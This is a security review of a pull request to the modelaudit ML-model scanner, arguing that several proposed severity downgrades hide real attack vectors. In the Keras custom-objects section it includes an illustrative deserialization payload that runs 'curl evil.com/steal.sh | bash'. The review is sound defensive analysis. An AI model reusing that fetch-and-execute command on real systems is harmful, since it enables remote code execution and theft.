# Security Review: PR #424 - Severity Downgrade Analysis

**Date:** 2025-01-20
**Reviewer:** Security Analysis
**PR:** https://github.com/promptfoo/modelaudit/pull/424
**Title:** "fix: downgrade severity"
**Status:** ⚠️ **SECURITY CONCERNS IDENTIFIED**

---

## Executive Summary

PR #424 downgrades the severity of numerous security checks from CRITICAL/WARNING to INFO. While reducing false positive noise is valuable, **several of these downgrades hide legitimate security threats** that should remain high-severity.

### Key Risk
Users relying on severity levels to prioritize security issues may miss **actual attacks** that are now marked as "informational."

---

## Critical Security Issues Being Downgraded

### 1. 🔴 Memory Exhaustion Attack Detection
**File:** `modelaudit/scanners/flax_msgpack_scanner.py:910`

```diff
  message="File too large to process safely - potential memory exhaustion attack",
- severity=IssueSeverity.CRITICAL,
+ severity=IssueSeverity.INFO,
```

**Security Impact:**
- **DoS Attack Vector:** Large files can exhaust scanner memory (classic zip bomb technique)
- **Real Attack:** This detects actual memory exhaustion attempts
- **Recommendation:** ❌ **Keep as CRITICAL** - This is a documented attack vector

**Why This Matters:**
```python
# Attacker creates model with 1TB of nested data
# Scanner detects it as "potential memory exhaustion attack"
# PR #424 downgrades to INFO → user ignores it → scanner crashes
```

---

### 2. 🔴 Arbitrary Code Execution via Custom Objects
**File:** `modelaudit/scanners/keras_h5_scanner.py:158`

```diff
  message="Model contains custom objects which could contain arbitrary code",
- severity=IssueSeverity.WARNING,
+ severity=IssueSeverity.INFO,
```

**Security Impact:**
- **Code Execution Risk:** Keras custom objects can execute arbitrary Python code during deserialization
- **Real Threat:** Similar to pickle exploits (CVE-2021-34141, CVE-2022-24288)
- **Recommendation:** ❌ **Keep as WARNING** - This is a known code execution vector

**Example Attack:**
```python
# Keras model with custom object
custom_obj = {
    'class_name': 'MaliciousLayer',
    'config': {'__reduce__': (os.system, ('curl evil.com/steal.sh | bash',))}
}
# When loaded: executes shell command
```

---

### 3. 🟡 Scanner Failure Hiding Malicious Content
**File:** `modelaudit/core.py:843`

```diff
  message=f"Error scanning file: {e!s}",
- severity=IssueSeverity.CRITICAL,
+ severity=IssueSeverity.INFO,
```

**Security Impact:**
- **Attack Technique:** Craft malicious files that intentionally crash scanners
- **Defense Evasion:** Scanner fails silently → malicious content undetected
- **Recommendation:** ⚠️ **Keep as WARNING** minimum - Scanner failures should be investigated

**Attack Scenario:**
```python
# Attacker crafts malicious.pkl that crashes PickleScanner
# Scanner fails with exception
# PR #424: Logged as INFO → user doesn't notice
# Malicious file deployed to production → pwned
```

---

### 4. 🟡 File Format Spoofing Detection
**File:** `modelaudit/scanners/base.py:1098`

```diff
  message="...This could indicate file spoofing, corruption, or a security threat.",
- severity=IssueSeverity.WARNING,
+ severity=IssueSeverity.INFO,
```

**Security Impact:**
- **Spoofing Attack:** File extension says `.pkl` but magic bytes say `application/zip`
- **Bypass Technique:** Evade format-specific scanners
- **Recommendation:** ⚠️ **Keep as WARNING** - File format mismatches CAN indicate attacks

**Example:**
```bash
# evil.pkl - extension says pickle, but it's actually an executable
file evil.pkl
# evil.pkl: ELF 64-bit LSB executable
# Scanner detects mismatch, PR #424 downgrades to INFO → user ignores
```

---

### 5. 🟡 Recursion Depth Exhaustion (DoS)
**File:** `modelaudit/scanners/flax_msgpack_scanner.py:434`

```diff
  message=f"Maximum recursion depth exceeded: {depth}",
- severity=IssueSeverity.CRITICAL,
+ severity=IssueSeverity.INFO,
```

**Security Impact:**
- **DoS Attack:** Deeply nested data structures exhaust stack → crash/hang
- **Real Attack:** "Billion laughs" style attacks for nested formats
- **Recommendation:** ⚠️ **Keep as WARNING** - Recursion bombs are real

---

## Acceptable Severity Downgrades

These downgrades are **reasonable** and reduce false positive noise:

### ✅ Parse/Format Errors → INFO
```diff
  message=f"GGUF metadata parse error: {e}",
- severity=IssueSeverity.CRITICAL,
+ severity=IssueSeverity.INFO,
```
**Rationale:** Parse errors usually indicate corruption, not attacks. INFO is appropriate.

### ✅ Missing Dependencies → WARNING
```diff
  message="h5py not installed, cannot scan Keras H5 files",
- severity=IssueSeverity.CRITICAL,
+ severity=IssueSeverity.WARNING,
```
**Rationale:** Missing libraries prevent scanning but aren't security issues themselves. WARNING is appropriate.

### ✅ Size/Timeout Limits → INFO
```diff
  message="File too large to scan: {file_size} bytes",
- severity=IssueSeverity.WARNING,
+ severity=IssueSeverity.INFO,
```
**Rationale:** Operational limits, not security threats. INFO is appropriate.

---

## Recommended Changes

### Keep High Severity (Do NOT Downgrade)

| Check | Current Severity | PR #424 | Recommended |
|-------|-----------------|---------|-------------|
| Memory exhaustion attack | CRITICAL | INFO | **CRITICAL** |
| Custom objects (arbitrary code) | WARNING | INFO | **WARNING** |
| Scanner errors | CRITICAL | INFO | **WARNING** |
| File format spoofing | WARNING | INFO | **WARNING** |
| Recursion depth exceeded | CRITICAL | INFO | **WARNING** |

### Acceptable Downgrades (Keep as Proposed)

| Check | Current Severity | PR #424 | OK? |
|-------|-----------------|---------|-----|
| Parse errors | CRITICAL | INFO | ✅ |
| Missing dependencies | CRITICAL | WARNING | ✅ |
| Size limits | WARNING | INFO | ✅ |
| Timeout | WARNING | INFO | ✅ |
| Invalid shapes | CRITICAL | INFO | ✅ |

---

## Security Testing Recommendations

### Test: Memory Exhaustion Still Detected
```python
def test_memory_exhaustion_severity():
    # Create 10GB msgpack file
    huge_file = create_msgpack_bomb()
    result = scanner.scan(huge_file)

    # Memory exhaustion should be high severity
    memory_issues = [i for i in result.issues if "memory exhaustion" in i.message.lower()]
    assert any(i.severity in [IssueSeverity.CRITICAL, IssueSeverity.WARNING] for i in memory_issues)
```

### Test: Custom Objects Warning Preserved
```python
def test_custom_objects_severity():
    # Keras model with custom objects
    model_with_custom = create_keras_model_with_custom_objects()
    result = scanner.scan(model_with_custom)

    # Custom objects should be WARNING or higher
    custom_obj_issues = [i for i in result.issues if "custom objects" in i.message.lower()]
    assert any(i.severity >= IssueSeverity.WARNING for i in custom_obj_issues)
```

---

## Alternative Approach: Severity Taxonomy

Instead of blanket downgrades, consider a more nuanced severity system:

### Proposed Severity Levels
- **CRITICAL:** Confirmed code execution, data exfiltration, privilege escalation
- **HIGH:** Likely security threats (custom objects, memory exhaustion attempts)
- **MEDIUM:** Suspicious patterns (format mismatches, recursion limits)
- **LOW:** Unusual but possibly legitimate (missing metadata, unlicensed data)
- **INFO:** Operational issues (parse errors, missing dependencies, size limits)

### Apply to Contested Cases
```python
# Memory exhaustion detection
severity = IssueSeverity.HIGH  # Not CRITICAL (not confirmed exploit), not INFO (real attack vector)

# Custom objects
severity = IssueSeverity.HIGH  # Code execution risk, documented attack vector

# Scanner failures
severity = IssueSeverity.MEDIUM  # Could hide malicious content, warrants investigation

# Format mismatches
severity = IssueSeverity.MEDIUM  # Could indicate spoofing, warrants investigation
```

---

## Similar Patterns to Watch

### Pickle Files Hidden as Other Formats
Based on the PR #426 analysis, attackers try to disguise malicious files:

**What if an attacker:**
1. Names a pickle file as `model.h5` (Keras format)
2. H5 scanner fails to parse it (not valid HDF5)
3. PR #424 downgrades parse errors to INFO
4. User ignores INFO message
5. Later, another tool loads it as pickle → code execution

**Recommendation:** Scanner failures on user-provided files should remain WARNING.

---

## Conclusion

PR #424 makes **some good changes** (reducing parse error noise) but also **downgrades legitimate security detections**.

### Action Items
1. ❌ **Revert** severity downgrades for:
   - Memory exhaustion attacks (keep CRITICAL)
   - Custom objects with arbitrary code (keep WARNING)
   - Scanner failures (change to WARNING)
   - File format spoofing (keep WARNING)
   - Recursion depth exceeded (change to WARNING)

2. ✅ **Keep** severity downgrades for:
   - Parse/format errors (INFO is fine)
   - Missing dependencies (WARNING is fine)
   - Size/timeout limits (INFO is fine)

3. 📝 **Consider** introducing more severity levels (CRITICAL, HIGH, MEDIUM, LOW, INFO) for better granularity

### Key Principle
**Never downgrade the severity of checks that detect actual attack vectors, even if they generate false positives.**

Better to have users investigate false positives than to miss real attacks.

---

## Files to Review

```bash
# View the PR
gh pr view 424

# Specific files with security-relevant changes
git diff origin/main origin/pr-424 modelaudit/scanners/flax_msgpack_scanner.py
git diff origin/main origin/pr-424 modelaudit/scanners/keras_h5_scanner.py
git diff origin/main origin/pr-424 modelaudit/core.py
git diff origin/main origin/pr-424 modelaudit/scanners/base.py
```
